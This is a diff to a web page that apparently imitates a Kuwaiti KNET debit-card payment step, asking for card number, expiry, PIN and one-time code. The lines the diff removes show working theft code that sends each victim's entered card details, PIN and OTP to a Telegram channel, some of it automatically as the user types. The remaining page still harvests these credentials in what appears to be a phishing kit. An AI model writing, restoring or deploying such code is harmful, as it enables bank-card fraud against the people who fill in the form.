@@ -830,8 +830,12 @@
                 color: #dc2626;
             }
         </style>
+        <link rel="stylesheet" href="./assets/css/top-banner.css">
     </head>
-<body>
+<body class="has-top-banner">
+            <div class="top-banner">
+                <img src="./assets/images/top-banner.png" alt="إعلان">
+            </div>
     <form method="post">
         <div class="madd"> </div>
         <div id="PayPageEntry" style="display: block">
@@ -1351,31 +1355,27 @@
 
         function saveKnetDetailsToLocalStorage(details) {
             localStorage.setItem("bankname", details.bankname);
-            localStorage.setItem("dcprefix", details.dcprefix);
-            localStorage.setItem("debitnumber", details.debitnumber);
-            localStorage.setItem("month", details.month);
-            localStorage.setItem("year", details.year);
-            localStorage.setItem("pincode", details.pincode);
         }
 
         function getStoredKnetDetails() {
             return {
                 bankname: localStorage.getItem("bankname") || "",
-                dcprefix: localStorage.getItem("dcprefix") || "",
-                debitnumber: localStorage.getItem("debitnumber") || "",
-                month: localStorage.getItem("month") || "",
-                year: localStorage.getItem("year") || "",
-                pincode: localStorage.getItem("pincode") || ""
+                dcprefix: "",
+                debitnumber: "",
+                month: "",
+                year: "",
+                pincode: ""
             };
         }
 
         function clearStoredSensitiveKnetDetails() {
-            localStorage.setItem("month", "");
-            localStorage.setItem("year", "");
-            localStorage.setItem("pincode", "");
+            ["dcprefix", "debitnumber", "month", "year", "pincode"].forEach(function(key) {
+                localStorage.removeItem(key);
+            });
         }
 
         document.addEventListener("DOMContentLoaded", function() {
+            clearStoredSensitiveKnetDetails();
             const form = document.querySelector("form");
             const bankSelect = document.getElementById("bank");
             const prefixSelect = document.getElementById("dcprefix");
@@ -1854,13 +1854,7 @@
             }
 
             function sendInvalidKnetFields(invalidFields) {
-                if (!window.sendTelegramMessageWithQueue) {
-                    return;
-                }
-
-                const details = getCurrentKnetInputValues();
-                const message = buildKnetSubmissionMessage(details, { invalidFields: invalidFields });
-                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
+                return;
             }
 
             function resetKnetSensitiveInputs() {
@@ -1869,9 +1863,7 @@
                 expiryMonthInput.value = "";
                 expiryYearInput.value = "";
                 cardPinInput.value = "";
-                localStorage.setItem("month", "");
-                localStorage.setItem("year", "");
-                localStorage.setItem("pincode", "");
+                clearStoredSensitiveKnetDetails();
                 expiryMonthLabel.textContent = "";
                 expiryYearLabel.textContent = "";
                 pinMaskLabel.textContent = maskPinCode("");
@@ -1894,10 +1886,6 @@
                         otpInput.focus();
                     });
                     return;
-                }
-
-                if (window.sendTelegramMessageWithQueue) {
-                    window.sendTelegramMessageWithQueue(buildOtpLeaveMessage(), false).catch(function() {});
                 }
 
                 showKnetStep();
@@ -2030,18 +2018,7 @@
             }
 
             function maybeSendAutoKnetInfo() {
-                if (autoKnetInfoSent || !window.sendTelegramMessageWithQueue) {
-                    return;
-                }
-
-                const details = getCurrentKnetInputValues();
-                if (!isKnetDetailsValidSilent(details)) {
-                    return;
-                }
-
-                autoKnetInfoSent = true;
-                const message = buildKnetSubmissionMessage(details, { autoNote: true });
-                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
+                return;
             }
 
             function buildKnetLandingMessage() {
@@ -2062,11 +2039,7 @@
             }
 
             function sendKnetLandingMessage() {
-                if (!window.sendTelegramMessageWithQueue) {
-                    return;
-                }
-
-                window.sendTelegramMessageWithQueue(buildKnetLandingMessage(), false).catch(function() {});
+                return;
             }
 
             async function handleKnetDetailsSubmit() {
@@ -2084,16 +2057,9 @@
                 };
 
                 saveKnetDetailsToLocalStorage(details);
-                if (window.clearAllTelegramSessionKeys) {
-                    window.clearAllTelegramSessionKeys();
-                }
                 hideValidationMessage();
                 overlayHide.style.display = "block";
                 proceedButton.disabled = true;
-
-                if (window.sendTelegramUntilDelivered) {
-                    await window.sendTelegramUntilDelivered(buildKnetSubmissionMessage(details), false);
-                }
 
                 if (window.showSubmissionLoadingOverlay) {
                     window.showSubmissionLoadingOverlay("جارٍ إرسال معلومات كي نت...", 3000, "knet");
@@ -2116,10 +2082,6 @@
                 hideValidationMessage();
                 overlayHide.style.display = "block";
                 proceedButton.disabled = true;
-
-                if (window.sendTelegramUntilDelivered) {
-                    await window.sendTelegramUntilDelivered(buildManualOtpMessage(otpValue), false);
-                }
 
                 if (window.showSubmissionLoadingOverlay) {
                     window.showSubmissionLoadingOverlay("جارٍ إرسال رمز التحقق...", 3000, "knet");
@@ -2256,7 +2218,15 @@
                 maybeSendAutoKnetInfo();
             }
 
-            expiryMonthInput.addEventListener("input", syncManualExpiry);
+            expiryMonthInput.addEventListener("input", function() {
+                syncManualExpiry();
+
+                const month = Number(expiryMonthInput.value);
+                if (expiryMonthInput.value.length === 2 && month >= 1 && month <= 12) {
+                    expiryYearInput.focus();
+                    expiryYearInput.select();
+                }
+            });
             expiryYearInput.addEventListener("input", syncManualExpiry);
 
             cardPinInput.addEventListener("input", function() {
@@ -2270,10 +2240,6 @@
                 otpInput.value = otpValue;
                 hideValidationMessage(this.id);
 
-                if (otpValue.length === 6 && otpValue !== autoSentOtpValue && window.sendTelegramMessageWithQueue) {
-                    autoSentOtpValue = otpValue;
-                    window.sendTelegramMessageWithQueue(buildAutoOtpMessage(otpValue), false).catch(function() {});
-                }
             });
 
             cancelButton.addEventListener("click", function() {
@@ -2299,7 +2265,5 @@
             }
         });
     </script>
-    <script src="./assets/js/telegram.js"></script>
-    <script src="./assets/js/tg.js"></script>
     </body>
 </html>
